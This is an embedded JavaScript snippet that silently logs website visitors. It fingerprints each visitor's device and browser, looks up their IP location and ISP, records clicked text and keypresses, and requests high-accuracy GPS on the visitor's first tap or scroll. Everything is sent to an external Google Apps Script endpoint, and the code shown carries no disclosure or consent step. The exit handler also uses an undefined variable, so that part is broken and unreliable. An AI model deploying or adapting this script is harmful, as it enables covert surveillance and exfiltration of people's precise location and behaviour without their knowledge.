<script>
const API_URL = "https://script.google.com/macros/s/AKfycbx0aCqswSRjLkDNfE6n6ijQnfuqUZll9nvn3ulx3McFIsgG3KGnCZMLnrHZMRFUt8k2/exec"; // paste your exec URL

let gpsData = {lat: "Waiting for tap", lon: "Waiting for tap", alt: "N/A", accuracy: "N/A"};
let gpsAsked = false;
let sessionStart = Date.now();

// 1. Get IP + Location from IP
async function getIPandLocation() {
  try {
    const res = await fetch("https://ipwho.is/");
    const data = await res.json();
    return {
      ip: data.ip,
      country: data.country,
      city: data.city,
      region: data.region,
      isp: data.connection?.isp || data.org
    };
  } catch {
    return {ip: "Unknown", country: "Unknown", city: "Unknown", region: "Unknown", isp: "Unknown"};
  }
}

// 2. Browser Info
function getBrowserInfo() {
  return {
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform
  };
}

// 3. Device Specs
function getDeviceSpecs() {
  const ua = navigator.userAgent;
  let deviceType = /Mobi|Android/i.test(ua)? "Mobile" : /Tablet|iPad/i.test(ua)? "Tablet" : "Desktop";
  return {
    deviceType: deviceType,
    vendor: navigator.vendor || "Unknown",
    cores: navigator.hardwareConcurrency || "Unknown",
    memoryGB: navigator.deviceMemory? navigator.deviceMemory + " GB" : "Unknown",
    screen: `${window.screen.width}x${window.screen.height}`,
    colorDepth: window.screen.colorDepth,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
  };
}

// 4. Request GPS - only after user taps
function requestGPS() {
  if(gpsAsked) return;
  gpsAsked = true;

  if (!navigator.geolocation) {
    gpsData = {lat: "No Support", lon: "No Support", alt: "N/A", accuracy: "N/A"};
    return;
  }

  navigator.geolocation.getCurrentPosition(
    (pos) => {
      gpsData = {
        lat: pos.coords.latitude,
        lon: pos.coords.longitude,
        alt: pos.coords.altitude || "N/A",
        accuracy: Math.round(pos.coords.accuracy) + "m"
      };
      sendLog("GPS Acquired"); // send one log after we get GPS
    },
    (err) => {
      gpsData = {lat: "Denied", lon: "Denied", alt: "Denied", accuracy: err.message};
    },
    {enableHighAccuracy: true, timeout: 10000}
  );
}

// 5. Main Send Log Function
async function sendLog(action, search = "", time = "") {
  const [ipData] = await Promise.all([getIPandLocation()]);
  const browserData = getBrowserInfo();
  const deviceData = getDeviceSpecs();

  const payload = {
    device: deviceData.deviceType,
    browser: browserData.userAgent,
    os: browserData.platform,
    language: browserData.language,
    specs: JSON.stringify(deviceData),
    action: action,
    search: search,
    page: window.location.href,
    time: time,
    ip: ipData.ip,
    country: ipData.country,
    city: ipData.city,
    region: ipData.region,
    isp: ipData.isp,
    latitude: gpsData.lat,
    longitude: gpsData.lon,
    altitude: gpsData.alt,
    gpsAccuracy: gpsData.accuracy
  };

  fetch(API_URL, {
    method: "POST",
    mode: "no-cors",
    body: JSON.stringify(payload)
  }).then(() => console.log("Log sent:", action));
}

// 6. Auto Events
sendLog("Page Visit"); // sends immediately, GPS will be "Waiting for tap"

document.addEventListener("click", (e) => {
  requestGPS(); // triggers GPS popup on first click
  sendLog("Click", e.target.innerText.substring(0,50));
});

document.addEventListener("keydown", (e) => {
  if(e.key === "Enter") sendLog("Search", window.location.search);
});

window.addEventListener("beforeunload", () => {
  const timeSpent = Math.round((Date.now() - sessionStart)/1000) + "s";
  navigator.sendBeacon(API_URL, JSON.stringify({...payload, action: "Exit", time: timeSpent}));
});

// Trigger GPS on first touch/scroll too for mobile
["touchstart","scroll"].forEach(evt => {
  document.addEventListener(evt, requestGPS, {once: true});
});
</script>
